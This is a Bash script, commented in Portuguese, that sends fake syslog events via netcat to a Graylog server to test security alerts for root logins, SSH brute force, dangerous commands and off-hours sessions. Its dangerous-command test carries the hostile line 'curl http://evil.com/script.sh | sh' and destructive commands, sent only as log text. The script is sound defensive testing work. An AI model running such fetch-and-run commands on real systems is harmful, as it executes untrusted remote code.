#!/bin/bash
# Script de Teste de Alertas - CSI do Linux
# Gera logs de teste para validar que os alertas estão funcionando.
# ATENÇÃO: Execute apenas em ambiente de teste/homologação!

set -e

GRAYLOG_HOST="${GRAYLOG_HOST:-localhost}"
GRAYLOG_SYSLOG_PORT="${GRAYLOG_SYSLOG_PORT:-1514}"

log_info() { echo "[INFO] $1"; }
log_warn() { echo "[WARN] $1"; }
log_error() { echo "[ERROR] $1"; }

send_syslog() {
    local facility=$1 severity=$2 app_name=$3 message=$4
    local pri=$((facility * 8 + severity))
    local timestamp=$(date "+%b %d %H:%M:%S")
    local hostname=$(hostname)

    echo "<${pri}>${timestamp} ${hostname} ${app_name}: ${message}" | \
        nc -u -w1 "${GRAYLOG_HOST}" "${GRAYLOG_SYSLOG_PORT}"
}

test_root_login() {
    log_info "Testando Alerta 1: SSH Root Login Detected"
    send_syslog 4 6 "sshd" "pam_unix(sshd:session): session opened for user root by (uid=0)"
    send_syslog 4 6 "sshd" "Accepted publickey for root from 192.168.1.100 port 54321 ssh2"
    log_info "O alerta deve disparar em até 1 minuto."
}

test_brute_force() {
    log_info "Testando Alerta 2: Brute Force Attempt Detected"
    log_info "Enviando 15 falhas de autenticação..."

    local attacker_ip="10.0.0.99"
    for i in $(seq 1 15); do
        if [ $((i % 2)) -eq 0 ]; then
            send_syslog 4 4 "sshd" "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=${attacker_ip}"
        else
            send_syslog 4 4 "sshd" "Failed password for invalid user admin from ${attacker_ip} port 22 ssh2"
        fi
        sleep 0.1
    done

    log_info "15 falhas enviadas. Alerta deve disparar em até 1 minuto (threshold: >10 em 5 min)"
}

test_dangerous_command() {
    log_info "Testando Alerta 3: Dangerous Command Executed"
    send_syslog 4 5 "tlog-rec-session" "TLOG_USER=testuser TLOG_REC=test123 TLOG_LOGIN=testuser"
    send_syslog 4 5 "tlog-rec-session" "rm -rf /tmp/test"
    send_syslog 4 5 "tlog-rec-session" "chmod 777 /var/www/html"
    send_syslog 4 5 "tlog-rec-session" "curl http://evil.com/script.sh | sh"
    log_info "O alerta deve disparar em até 1 minuto."
}

test_privileged_session() {
    log_info "Testando Alerta 4: Privileged User Session Started"
    send_syslog 4 5 "tlog-rec-session" "rec TLOG_USER=root TLOG_LOGIN=admin TLOG_REC=session456"
    log_info "O alerta deve disparar em até 1 minuto."
}

test_after_hours() {
    log_info "Testando Alerta 5: After-Hours Activity Detected"
    log_warn "Este teste só funciona fora do horário comercial ou com a pipeline configurada."
    send_syslog 4 6 "sshd" "pam_unix(sshd:session): session opened for user admin by (uid=1000)"
    log_info "Se estiver fora do horário, o alerta deve disparar em até 5 minutos."
}

show_help() {
    cat << 'EOF'
Script de Teste de Alertas do Graylog

Uso: ./test-alerts.sh [opção]

Opções:
  1, root-login      Testa alerta de login root
  2, brute-force     Testa alerta de brute force (15 falhas)
  3, dangerous-cmd   Testa alerta de comando perigoso
  4, privileged      Testa alerta de sessão privilegiada
  5, after-hours     Testa alerta fora de horário
  all                Executa todos os testes
  help               Mostra esta ajuda

Variáveis de ambiente:
  GRAYLOG_HOST         Host do Graylog (padrão: localhost)
  GRAYLOG_SYSLOG_PORT  Porta syslog UDP (padrão: 1514)

Exemplos:
  ./test-alerts.sh brute-force
  GRAYLOG_HOST=127.0.0.1 ./test-alerts.sh all
EOF
}

check_deps() {
    if ! command -v nc &> /dev/null; then
        log_error "netcat (nc) não encontrado. Instale com: dnf install nmap-ncat"
        exit 1
    fi
}

main() {
    check_deps

    case "${1:-help}" in
        1|root-login)     test_root_login ;;
        2|brute-force)    test_brute_force ;;
        3|dangerous-cmd)  test_dangerous_command ;;
        4|privileged)     test_privileged_session ;;
        5|after-hours)    test_after_hours ;;
        all)
            log_info "Executando todos os testes..."
            echo ""
            test_root_login;        echo ""; sleep 2
            test_brute_force;       echo ""; sleep 2
            test_dangerous_command; echo ""; sleep 2
            test_privileged_session; echo ""; sleep 2
            test_after_hours;       echo ""
            log_info "Todos os testes enviados! Verifique em: Alerts > Events"
            ;;
        help|--help|-h) show_help ;;
        *)
            log_error "Opção desconhecida: $1"
            show_help
            exit 1
            ;;
    esac
}

main "$@"
